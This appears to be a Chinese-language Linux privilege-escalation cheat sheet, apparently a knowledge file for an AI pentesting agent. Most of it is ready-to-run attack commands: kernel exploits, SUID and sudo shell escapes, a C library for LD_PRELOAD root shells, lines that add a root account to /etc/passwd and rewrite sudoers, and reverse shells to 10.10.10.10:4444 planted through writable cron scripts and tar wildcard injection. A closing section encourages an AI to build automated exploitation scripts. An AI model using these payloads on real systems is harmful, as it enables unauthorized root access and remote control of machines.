# Linux 提权

Linux 提权涉及内核漏洞、SUID程序、sudo配置、Cron任务等多种技术。

## 信息收集

### 系统信息
```bash
uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version
lsb_release -a
```

### 用户信息
```bash
whoami
id
cat /etc/passwd
cat /etc/group
cat /etc/shadow  # 需要root
w
who
last
```

### 网络信息
```bash
ifconfig
ip addr
route
netstat -antup
ss -antup
iptables -L
```

### 进程和服务
```bash
ps aux
ps -ef
top
systemctl list-units --type=service
service --status-all
```

### Cron 任务
```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
```

## 内核漏洞

### 检测工具
```bash
# Linux Exploit Suggester
./linux-exploit-suggester.sh

# linux-smart-enumeration
./lse.sh -l 1

# LinEnum
./LinEnum.sh
```

### 常见漏洞
- Dirty COW (CVE-2016-5195)
- Dirty Pipe (CVE-2022-0847)
- PwnKit (CVE-2021-4034)
- Baron Samedit (CVE-2021-3156)

### 利用示例
```bash
# Dirty COW
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# Dirty Pipe
gcc dirtypipe.c -o dirtypipe
./dirtypipe /etc/passwd 1 ootz:
```

## SUID/SGID

### 查找 SUID
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

### 可利用的 SUID 程序
```bash
# nmap (旧版本)
nmap --interactive
!sh

# vim
vim -c ':!/bin/sh'

# find
find / -exec /bin/sh \; -quit

# bash
bash -p

# more/less
more /etc/passwd
!/bin/sh

# cp
cp /bin/sh /tmp/sh
chmod +s /tmp/sh
/tmp/sh -p
```

### GTFOBins
访问 https://gtfobins.github.io/ 查找可利用的二进制程序

## Sudo 配置

### 检查 sudo 权限
```bash
sudo -l
```

### Sudo 漏洞
```bash
# CVE-2019-14287 (Sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
./exploit
```

### 配置错误
```bash
# NOPASSWD
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# 通配符
# (ALL) NOPASSWD: /bin/cp /tmp/* /root/
echo "user ALL=(ALL) NOPASSWD: ALL" > /tmp/sudoers
sudo cp /tmp/sudoers /etc/sudoers

# 环境变量
# (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/sh
```

### LD_PRELOAD
```bash
# 检查
sudo -l
# env_keep+=LD_PRELOAD

# 创建恶意库
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <program>
```

## Cron 任务

### 查找 Cron
```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
crontab -l
cat /var/spool/cron/crontabs/*
```

### 可写脚本
```bash
# 查找可写的 cron 脚本
find /etc/cron* -type f -perm -o+w

# 修改脚本
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" >> /path/to/script.sh
```

### PATH 劫持
```bash
# cron 任务使用相对路径
# /usr/local/bin/backup.sh

# 创建恶意脚本
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" > /tmp/backup.sh
chmod +x /tmp/backup.sh

# 修改 PATH (如果可能)
```

### 通配符注入
```bash
# cron: tar czf /backup/backup.tar.gz *

# 创建恶意文件
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# 等待 cron 执行
```

## Capabilities

### 查找 Capabilities
```bash
getcap -r / 2>/dev/null
```

### 可利用的 Capabilities
```bash
# cap_setuid
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search
./tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar

# cap_sys_admin
# 可以挂载文件系统
```

## 文件权限

### 可写文件
```bash
# /etc/passwd
echo 'root2:$1$root$9gr5l0sMbLqL3xE0xLKUX/:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2  # password: root

# /etc/shadow
# 需要 root 权限读取

# /etc/sudoers
echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

### NFS no_root_squash
```bash
# 检查 NFS 配置
cat /etc/exports
# /share *(rw,no_root_squash)

# 攻击机挂载
mount -t nfs target:/share /mnt

# 创建 SUID shell
cp /bin/bash /mnt/bash
chmod +s /mnt/bash

# 目标机执行
/share/bash -p
```

## 环境变量

### PATH 劫持
```bash
# SUID 程序调用相对路径命令
# /usr/local/bin/service: system("ps")

# 创建恶意 ps
echo "/bin/bash" > /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH

# 执行 SUID 程序
/usr/local/bin/service
```

### LD_PRELOAD
```bash
# 创建恶意库
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
LD_PRELOAD=/tmp/shell.so <program>
```

## 自动化工具

### LinPEAS
```bash
./linpeas.sh
./linpeas.sh -a  # 全面检查
```

### LinEnum
```bash
./LinEnum.sh
./LinEnum.sh -t  # 详细输出
```

### linux-smart-enumeration
```bash
./lse.sh -l 1  # 快速检查
./lse.sh -l 2  # 详细检查
```

### pspy
```bash
# 监控进程
./pspy64
./pspy64 -pf -i 1000  # 每秒检查
```

---

**AI 发挥空间**：
- 根据系统版本选择合适的提权方法
- 分析系统配置发现提权路径
- 结合多种技术进行提权
- 开发自动化枚举和利用脚本

**反幻觉提示**：
- 不要假设所有系统都存在已知漏洞
- 验证目标系统的版本和配置
- 测试提权方法的实际效果
- 注意提权操作的稳定性
- 某些提权方法可能需要特定条件
